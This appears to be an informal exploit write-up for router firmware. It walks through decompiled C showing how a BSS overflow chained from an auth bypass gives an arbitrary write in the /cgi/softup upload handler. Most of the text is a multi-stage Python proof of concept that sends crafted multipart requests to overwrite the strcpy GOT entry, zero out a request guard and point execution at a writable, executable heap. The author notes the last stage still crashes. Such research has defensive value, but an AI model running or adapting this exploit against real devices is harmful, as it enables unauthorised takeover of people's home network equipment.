looking into /cgi/softup endpoint handler we can see this line
```c
if ( dword_433424 || (dword_433424 = cmem_updateFirmwareBufAlloc()) != 0 )
```
chaining the bss overflow from the auth bypass we can occupy dword_433424 so that itll skip the allocation. the handler calls `sub_403A2C` which parses the body of the http request and looks for something like this:
`Content-Disposition: form-data; name="filename"; filename="SOMENAME`. one of the functions it uses for parsing is this one
```c

int __fastcall sub_404C74(int fd, _DWORD *body, unsigned int DEST, int a4)
{
  int v4; // $s2
  _BYTE *v8; // $s0
  char *v9; // $v1
  int v10; // $v0
  ssize_t v11; // $v0
  ssize_t v12; // $v1
  bool v13; // dc
  int result; // $v0

  v4 = a4;
  if ( !a4 )
    return 0;
  v8 = (_BYTE *)DEST;
  while ( v4 != 1 )
  {
    v9 = (char *)body[1024];
    if ( (unsigned int)v9 >= body[1025] )
    {
      body[1024] = body;
      v11 = read(fd, body, 4096u);
      v12 = v11;
      if ( !v11 )
        return 0;
      v13 = v11 < 0;
      result = -1;
      if ( v13 )
        return result;
      body[1025] = body[1024] + v12;
    }
    else
    {
      v10 = *v9;
      --v4;
      *v8 = v10;
      body[1024] = v9 + 1;
      if ( v10 == 10 && DEST < (unsigned int)v8 && *(v8 - 1) == 13 )
      {
        ++v8;
        break;
      }
      ++v8;
    }
  }
  result = (int)&v8[-DEST];
  if ( DEST >= (unsigned int)v8 )
    return 0;
  *v8 = 0;
  return result;
}

```
here i named `DEST` the pointer we control: `dword_4334241` and body as the body is some sort of struct and the body of the http request. here we can see that that the read reads directly the contens 
of the body we give it into the arbitrary pointerwe chose. this is especially powerful because this firmware doesnt support PIE, therfore it can overwrite the GOT. however it has a limit. it writes also the junk bytes of  
`Content-Disposition: form-data; name="filename"; filename="SOMENAME`. into the poiner, and overwrite the junk bytes with the data we control at the end into the pointer. <br><br><br>


while debugging i found another issue. because we overflow so many bytes, we accidently turn on some kind of guard variable that returns code 403 respose.
meaning we have to put back 0x00 in the memory it exists (0x433370). ill do it with the strcpy()s abbility to put 1 nullbyte at the end of an overflow
```c
// sub_40402C, address 0x404374
if ( sub_405360(s[0]) != 1 
  || sub_4051C4(s) != 1          // THE GUARD reads dword_433370
  || ... )
{
    v3 = 403;                   
    goto LABEL_135;             
}
```
## PoC
i diveded the poc of few stages because its a long.'

**1**
here i insert the arbitrary pointer and zero out the guard. additionaly i put a nullbyte in to perfect the got adress because i cant write nulls
```py
import socket, struct, base64

TARGET = "192.168.1.1"
PORT = 80


# overwriting and putting the arbitrary pointer

WRITE_TO = 0x0041E89C # strcpy@got
addr = struct.pack(">I", WRITE_TO)[1:] # removing null byte
boundary = b"A" * 641 + addr
req = b"POST / HTTP/1.1\r\n"
req += b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"

s = socket.socket()
s.settimeout(10)
s.connect((TARGET, PORT))
s.sendall(req)
resp = b""
try:
    while d := s.recv(4096):
        resp += d
except:
    pass
s.close()

# insert a null byte in offset + 641
boundary = b"A" * 640
req = b"POST / HTTP/1.1\r\n"
req += b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"

s = socket.socket()
s.settimeout(10)
s.connect((TARGET, PORT))
s.sendall(req)
resp = b""
try:
    while d := s.recv(4096):
        resp += d
except:
    pass
s.close()

print(f"[*] Response: {resp[:200].decode(errors='replace')}")
if b"OK" in resp:
    print("[+] Payload written.")


# zeroing guard
for i in range(463, 459, -1):
    boundary = b"A" * i
    req = b"POST / HTTP/1.1\r\n"
    req += b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"

    s = socket.socket()
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.sendall(req)
    resp = b""
    try:
        while d := s.recv(4096):
            resp += d
    except:
        pass
    s.close()

```

**2**
step 2 is just running the basic auth bypass to repair the cred table because it was destroyed 
by the overflow while putting the arbitrary pointer in its place. without it itll reject every request and deny acsessing the /cgi/softup endpoint
<br><br>

**3**
this is the most complicated step. i put what i want to write inside the body together with the `Content-Disposition: form-data; name="filename"; filename="randomname.bin`. 
altough the arbitrary write works. this still segfaults because the junk bytes overwrite 70 bytes on the got.

```py
import socket, struct, base64

TARGET = "192.168.1.1"
PORT = 80
CREDS = "poc:poc"

PAYLOAD = 0x0041f000 # start of the heap mapping. its WX and theres no PIE

addr = struct.pack(">I", PAYLOAD)
boundary = b"no overflow this time"

# build body and put the data that i want to overwrite strcpy@got with
body  = b"--" + boundary + b"\r\n"
body += b'Content-Disposition: form-data; name="filename"; filename="randomname.bin"\r\n'
body += b"\r\n" + addr + b"\r\n"
body += b"--" + boundary + b"--\r\n"


auth = base64.b64encode(CREDS.encode()).decode()
req  = b"POST /cgi/softup HTTP/1.1\r\n"
req += f"Host: {TARGET}\r\n".encode()
req += f"Cookie: Authorization=Basic {auth}\r\n".encode()
req += f"Referer: http://{TARGET}/\r\n".encode()
req += b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
req += f"Content-Length: {len(body)}\r\n".encode()
req += b"Connection: close\r\n\r\n"
req += body


s = socket.socket()
s.settimeout(10)
s.connect((TARGET, PORT))
s.sendall(req)
resp = b""
try:
    while d := s.recv(4096):
        resp += d
except: pass
s.close()

print(f"[*] Response: {resp[:200].decode(errors='replace')}")
if b"OK" in resp:
    print("[+] Payload written.")
```
